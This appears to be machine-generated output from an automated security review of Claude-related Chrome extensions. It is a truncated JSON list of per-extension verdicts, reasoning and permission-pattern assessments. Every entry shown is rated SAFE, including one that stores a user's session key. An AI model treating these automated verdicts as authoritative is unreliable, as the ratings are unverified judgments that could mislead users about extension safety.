@@ -1,0 +1,3506 @@
+{
+  "dataset": "claude_clones",
+  "retrieved_at": "2026-01-31T11:00:46.489060",
+  "total_extensions": 56,
+  "summary": {
+    "MALICIOUS": 1,
+    "SUSPICIOUS": 2,
+    "SAFE": 53,
+    "NEED_MORE_FILES": 0,
+    "ERROR": 0
+  },
+  "token_usage": {
+    "prompt_tokens": 2836289,
+    "candidate_tokens": 39930,
+    "total_tokens": 2939880
+  },
+  "validations": [
+    {
+      "extension_id": "jaadjbgpijajmhponmgggflfgmboknge",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose. It fetches usage data from the official Claude API using the user's existing session (credentials: 'include') and displays it using SVG charts. All static analysis flags were verified to be benign: the network endpoints are SVG namespaces, the storage is for local configuration, and the fetch calls are restricted to the claude.ai domain. No evidence of data exfiltration, third-party tracking, or obfuscation was found.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Monitor Claude usage limits with visual charts and periodic updates",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/2000/svg"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT (http://www.w3.org/2000/svg)",
+          "usage": "LEGITIMATE",
+          "justification": "This is the standard XML namespace for SVG elements. The code uses document.createElementNS to programmatically generate charts."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user preferences (view mode, column count) and the required organizationId for fetching API data."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used to call the official Claude.ai API (https://claude.ai/api/organizations/{orgId}/usage) to retrieve the user's usage statistics."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used for a standard UI convenience: allowing the user to press 'Enter' to submit the settings modal."
+        },
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "Used to periodically refresh the usage data (every 5 minutes) as described in the extension's purpose."
+        }
+      ],
+      "token_usage": {
+        "prompt": 7557,
+        "candidates": 716,
+        "total": 9413
+      }
+    },
+    {
+      "extension_id": "djapokkdpogmnakdhenpejogeidnfjmi",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "After a thorough review of the content.js file, the extension is confirmed to be safe. It functions exactly as described: it scrapes the user's organization ID from the page (or via the bootstrap API), fetches the list of chat conversations from Claude's official API, and stores them in a local IndexedDB named 'ClaudeChatDB'. The keyboard listeners and DOM manipulations (innerHTML) are exclusively used for the search UI and the GitHub-style activity heat map. There is no code that transmits data to any third-party domain; all network requests are directed to claude.ai or api.claude.ai. The use of 'storage' permission and IndexedDB is properly justified for offline/fast search performance.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Provides a search interface and activity graph for Claude AI chat history.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://api.claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://your-privacy-policy-url.com"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used throughout content.js to construct the UI for the search overlay and the activity graph. This is standard practice for extensions that inject custom interface elements into a page."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to implement the keyboard shortcuts (Alt+Shift+F and Alt+Shift+G) as well as UI navigation (Arrow keys/Escape) within the extension's search interface."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used to retrieve conversation history and organization metadata directly from Claude's official APIs (api.claude.ai) to populate the local search index. It correctly uses 'credentials: include' to leverage the user's existing session."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to detect when Claude's page header is loaded so the extension can inject an 'Activity Graph' button into the native UI."
+        }
+      ],
+      "token_usage": {
+        "prompt": 15844,
+        "candidates": 729,
+        "total": 17339
+      }
+    },
+    {
+      "extension_id": "ndbiekgckmjfcdmekbkdmoioohdjfhmg",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension appears to be a legitimate productivity tool for Claude AI users. While the manifest description is brief, the code clearly implements two main features: a prompt library manager and a 'Search and Refine' tool that fetches external web context via Jina AI to enhance user prompts. The security practices are above average for a browser extension; for instance, it uses the Web Crypto API to encrypt the user's OpenAI API key before saving it to local storage. There is no evidence of data exfiltration to developer-controlled servers; data is only sent to the specific AI services (OpenAI and Jina) required for the extension's features to function.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Manage custom prompts for Claude AI",
+          "hidden_functionality": "The extension includes a context-retrieval/search feature using Jina AI and OpenAI, which is a related AI-assistant capability not explicitly detailed in the manifest description but functionally relevant.",
+          "code_evidence": "function processUserInput(input, sender) { ... const openaiResponse = await makeOpenAIRequest(input, decryptedApiKey); ... const jinaData = await queryJinaAI(sanitizeResponse(openaiResponse)); ... }"
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://api.openai.com/v1/chat/completions",
+          "https://s.jina.ai/"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CREDENTIAL_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "The extension implements a sophisticated and secure method (PBKDF2 derivation and AES-GCM encryption) to store the user's own OpenAI API key locally for the search/refinement feature."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "OpenAI and Jina AI endpoints are used for the extension's core AI-assistant features (query generation and web search retrieval)."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js and sidepanel.js to render the UI for prompt management. The content injected is controlled by the user or static templates."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store custom prompt templates and the encrypted API key locally on the user's machine."
+        }
+      ],
+      "token_usage": {
+        "prompt": 10641,
+        "candidates": 772,
+        "total": 13214
+      }
+    },
+    {
+      "extension_id": "nohdababhjlafcabhgehiigdbaaddafh",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code is clean and directly aligns with its stated purpose of providing Text-to-Speech (TTS) for Claude.ai. The content script correctly identifies Claude's message containers (p.whitespace-pre-wrap.break-words) and uses the native browser 'speechSynthesis' API to read the text. There are no external fetch/XHR calls that transmit user data; all processing occurs locally. The permissions (storage, activeTab) are minimal and appropriate for the functionality provided. The static analysis findings regarding storage and DOM mutation are standard requirements for an extension that modifies a dynamic web page like Claude.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Read Aloud/TTS for Claude.ai",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://chrome.google.com/webstore/detail/"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store the 'isEnabled' boolean state so the extension can remember if the user turned the TTS features on or off."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to watch for new messages being rendered in the Claude.ai chat interface so that the 'Read Aloud' button can be dynamically injected into new chat bubbles."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to inject static SVG icon paths into the buttons created by the extension."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoints found in popup.js are links to the Chrome Web Store used for a sharing feature via navigator.share."
+        }
+      ],
+      "token_usage": {
+        "prompt": 6399,
+        "candidates": 635,
+        "total": 7880
+      }
+    },
+    {
+      "extension_id": "mkdlpckejjdnmfmhemggjpjajpafonif",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension's primary logic resides in 'content.js', which directly implements the stated purpose of modifying Claude.ai's CSS to expand the input box and container width. The numerous findings in the larger JS files (354.js, 418.js, 661.js, popup.js, settings.js) are characteristic of a production build using modern frameworks and libraries. Specifically, the analysis identifies DOMPurify (for sanitization), Canvg (for SVG processing), html2canvas (for layout capture), and React (for the UI). There is no evidence of sensitive data collection or transmission to external domains. A small piece of code in 'background.js' attempts to open a wallpaper URL on an alarm trigger, but it is benign and lacks the necessary manifest permissions to function.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Customize claude.ai with a bigger text box for a better typing experience.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://react.dev",
+          "http://www.w3.org"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://c4.wallpaperflare.com",
+          "https://github.com/zloirock/core-js"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used within the DOMPurify (418.js) and React (popup.js) libraries for safe DOM manipulation and component rendering."
+        },
+        {
+          "pattern": "DYNAMIC_SCRIPT",
+          "usage": "LEGITIMATE",
+          "justification": "Production artifact of the Webpack bundler used for code-splitting in the settings/popup UI."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used by the Canvg library (661.js) to load SVG assets and by the settings UI for standard framework operations."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store and sync user preferences for UI modifications (e.g., 'claud_settings')."
+        }
+      ],
+      "token_usage": {
+        "prompt": 225779,
+        "candidates": 736,
+        "total": 227713
+      }
+    },
+    {
+      "extension_id": "bkanngdinjghfcfgpcbdjckpajacpnbb",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose. It enhances the Claude UI by adding a 'Custom Instruction' feature and a 'Grouped Chat' view. The use of cookies and network requests is strictly limited to the 'claude.ai' domain to fetch the user's own conversation data. There is no evidence of data exfiltration to third-party servers, no credential theft, and no hidden dual-purpose logic. The static analysis flags represent standard web extension API usage for interacting with a target site's data and UI.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Enhance Your Claude AI Experience (Custom instructions and grouped chat history)",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_COOKIES",
+          "usage": "LEGITIMATE",
+          "justification": "The extension retrieves the 'lastActiveOrg' cookie to identify the user's organization ID, which is required to construct the API endpoint URL for fetching the user's own chat history."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "The fetch call is directed to claude.ai's internal API to retrieve chat conversations so the extension can re-organize and display them in groups."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store the user's defined 'Custom Instruction' text locally."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to construct the extension's UI components, such as the custom instruction popup and the grouped chat containers."
+        }
+      ],
+      "token_usage": {
+        "prompt": 6825,
+        "candidates": 657,
+        "total": 8403
+      }
+    },
+    {
+      "extension_id": "pcpjdbnjhgofgjgegodlnebdnmiddmaa",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code directly aligns with its stated purpose. It provides a 'Share' button on the Claude.ai interface. When clicked, it fetches the current conversation history from Claude's internal API and sends it to the extension's backend (shareclaude.pages.dev) to generate a public link. The data transmission is user-triggered, and there is no evidence of background data collection, credential harvesting, or hidden malicious payloads. The use of innerHTML is confined to safe, static SVG strings.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Claude chat conversation history (messages, attachments, artifacts)",
+          "processing_method": "The extension parses Claude's internal message format into a clean JSON structure specifically for the sharing service.",
+          "destination_domain": "https://shareclaude.pages.dev",
+          "code_evidence": "async function getShareURL(messages) { const response = await fetch(`${PAGE_URL}/api/chats`, { method: 'POST', body: JSON.stringify(messages) }); ... }"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Share your Claude chats with one click",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [
+          "https://shareclaude.pages.dev"
+        ],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used to fetch conversation data from Claude's API and to upload that data to the share service when the user clicks the button."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used only to inject static SVG icons for the 'Share' and 'Loading' states of the UI button."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to ensure the 'Share' button persists on the page as Claude's single-page application (SPA) updates the DOM."
+        }
+      ],
+      "token_usage": {
+        "prompt": 5094,
+        "candidates": 654,
+        "total": 6841
+      }
+    },
+    {
+      "extension_id": "khnkcffkddpblpjfefjalndfpgbbjfpc",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a utility tool that functions entirely locally. Analysis of the source code shows that it scrapes the DOM of claude.ai to extract conversation text, formats it into Markdown, HTML, JSON, or Text, and triggers a browser download using Blobs. Most importantly, the manifest.json requests ZERO permissions (`permissions: []`), meaning the extension cannot use 'chrome.storage', access other tabs, or make cross-origin network requests (fetch/XHR). There is no code present that attempts to send data to an external server; all 'data collection' is for the explicit purpose of generating the user-requested download file.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Download Claude conversations with support for headings, code blocks, and tables in multiple formats",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "w3.org"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used in the `downloadText` function to create a local download link for the exported conversation data. This is standard behavior for file-saving extensions."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to construct the string content for the HTML export format. Since the extension does not have network permissions and does not load external scripts, the risk of XSS is mitigated and the usage is purely for file generation."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to monitor the Claude.ai DOM for changes to ensure the 'Download' button remains present when the user navigates between chats or the UI updates."
+        },
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "Used as a fallback mechanism to re-inject the UI button if the MutationObserver misses a state change."
+        }
+      ],
+      "token_usage": {
+        "prompt": 9370,
+        "candidates": 684,
+        "total": 10984
+      }
+    },
+    {
+      "extension_id": "fhchfanincnnfjednblmkgkdglpfloja",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a standard UI customization tool for the Claude.ai website. Analysis of the manifest.json shows that permissions are empty, meaning the extension has no ability to make cross-origin network requests or access sensitive APIs. The content.js code is well-structured and focuses entirely on color manipulation, theme management, and UI rendering. There is no evidence of data collection, tracking, or communication with any external servers. The static analysis findings for innerHTML are false positives in terms of malicious intent, as they are used only to build the extension's overlay interface.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Enjoy your Claude, with a little bit of color.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "DOM INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "The use of innerHTML at lines 312, 430, and 723 is for creating the extension's own UI elements (theme selection modal, custom editor, and toolbar buttons). The content being injected is derived from internal static theme objects and CSS variables from the page, not unsanitized external or user-provided data."
+        }
+      ],
+      "token_usage": {
+        "prompt": 11162,
+        "candidates": 520,
+        "total": 12682
+      }
+    },
+    {
+      "extension_id": "jkgmppnpgldlaabcjlokgmfhfhljphhc",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code is transparent and strictly follows its stated purpose. It extracts chat content from a specific div on Claude.ai, packages it into a basic HTML template (using a standard Tailwind CSS CDN for styling), and utilizes the Chrome Downloads API via the background script to save the file locally. There is no evidence of data exfiltration, credential harvesting, or hidden network communication. The permissions requested ('downloads' and host permission for 'claude.ai') are necessary and appropriate for the functionality provided.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Save a Claude chat transcript as an HTML file",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://cdn.jsdelivr.net"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to set the SVG icon markup and label for a UI button added to the Claude interface."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to detect navigation within the Claude single-page application (SPA) to ensure the 'Download' button is re-injected when the chat URL changes."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The code simply checks if window.location.href starts with the Claude chat URL to determine if it should activate logic."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "The popup uses chrome.tabs.query to identify the active tab and execute the extraction script on the current chat page."
+        }
+      ],
+      "token_usage": {
+        "prompt": 3970,
+        "candidates": 648,
+        "total": 5387
+      }
+    },
+    {
+      "extension_id": "jehfklpmjdbjojimhlindcgocbjiflek",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a straightforward utility for interacting with Claude.ai. It asks the user for their session key (sk-ant-sid) because Claude's 'Projects' features are part of their web application and do not currently have a public-facing developer API that uses standard OAuth. The extension stores this token locally and uses it exclusively to make requests to the claude.ai domain. There is no evidence of data exfiltration to third-party servers, no obfuscation, and the code clearly maps to the functionality described in the manifest.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Easily add content to Claude projects from any website",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://clients2.google.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used to communicate with the official Claude.ai API to fetch projects and upload content as per the extension's stated purpose."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to persist the user's session key (token) and form state locally so the user doesn't have to re-enter credentials every time the popup opens."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to dynamically populate the project dropdown list based on data retrieved from the Claude API."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoint https://claude.ai/api/organizations is the official internal API endpoint for the Claude service the extension is designed to interact with."
+        }
+      ],
+      "token_usage": {
+        "prompt": 3830,
+        "candidates": 631,
+        "total": 5736
+      }
+    },
+    {
+      "extension_id": "gcfiiebelieioilonnjgjjmdlolapmgp",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a simple UI modifier. The code identifies specific message elements on claude.ai and changes their font family. The MutationObserver is a standard and necessary pattern for single-page applications (SPAs) like Claude to ensure styles are reapplied when new messages appear in the DOM. There are no network requests, no data collection, and no obfuscation. The permissions requested in the manifest are appropriate for the functionality provided.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Modifies Claude's UI with custom fonts and colors",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "DOM",
+          "usage": "LEGITIMATE",
+          "justification": "The code uses querySelectorAll to find chat message containers to apply font styles, which is the stated purpose of the extension."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to detect when new chat messages are rendered by Claude's dynamic UI so that custom styles can be applied to new elements automatically."
+        }
+      ],
+      "token_usage": {
+        "prompt": 2318,
+        "candidates": 500,
+        "total": 3382
+      }
+    },
+    {
+      "extension_id": "klelmbmfmighbombgilogfengbkajjie",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a utility tool that functions exactly as described. The source code reveals a straightforward logic: content.js identifies chat elements on Claude.ai using CSS selectors, converts them to Markdown, and sends them to popup.js. The popup allows users to edit the text and download it locally. There are no external network calls (fetch/XHR) observed in either file, meaning no data is being exfiltrated. The permissions requested (activeTab, storage) are the minimum required for this functionality.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Extract, edit, and save Claude conversations as beautiful markdown notes",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to persist extracted messages and UI state (removed indices, editing index) within chrome.storage.local so the user doesn't lose data when the popup closes."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Required to identify the active tab (claude.ai) and send messages to the content script for message extraction."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to render markdown-formatted content inside the popup after it has been processed by the marked.js library."
+        },
+        {
+          "pattern": "BLOB_URL",
+          "usage": "LEGITIMATE",
+          "justification": "Used in saveAsNote() to create a downloadable .md file from the extracted text using URL.createObjectURL(blob)."
+        }
+      ],
+      "token_usage": {
+        "prompt": 6940,
+        "candidates": 633,
+        "total": 8494
+      }
+    },
+    {
+      "extension_id": "jiibmnjnbfakfcdogafmdcmfjndglbkd",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "My analysis confirms this extension is a legitimate AI assistant with a commercial component. The static analysis flagged network calls to Gumroad, which are clearly used for license key verification and free trial management (handling trialEndDate in sync storage). The heavy usage of DOM manipulation patterns and MutationObservers are standard artifacts of the React framework and UI libraries (like goober) used to build the extension's interface. There is no evidence of data exfiltration from Claude.ai or credential theft.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI assistant for Claude.ai",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "api.gumroad.com",
+          "claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "react.dev",
+          "w3.org"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "The fetch call to api.gumroad.com is used for valid software license verification and trial period management."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used by the React framework and the 'goober' CSS-in-JS library for rendering UI components (toasts/prompts)."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used by the UI library to track element height for toast notifications and by the module preloader."
+        },
+        {
+          "pattern": "DYNAMIC_SCRIPT",
+          "usage": "LEGITIMATE",
+          "justification": "Artifact of the build tool (Vite/WXT) handling module preloading."
+        }
+      ],
+      "token_usage": {
+        "prompt": 134686,
+        "candidates": 613,
+        "total": 136210
+      }
+    },
+    {
+      "extension_id": "mimbihfbpnglcblklikcjmibobgmlknf",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose of managing Claude.ai conversations. Analysis of background.js, popup.js, and content.js shows that bookmarks (including conversation text and metadata) are stored strictly in 'chrome.storage.local'. There is no evidence of data exfiltration; no fetch or XHR calls are made to external servers. The network endpoints found are limited to the target site (claude.ai) and a legitimate donation link (BuyMeACoffee) in the popup UI. The code is well-structured, contains helpful comments, and lacks any obfuscation or suspicious string encoding techniques.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Organize and manage your conversations on claude.ai with bookmarks, categories, and search functionality.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://buymeacoffee.com/hafizriaz",
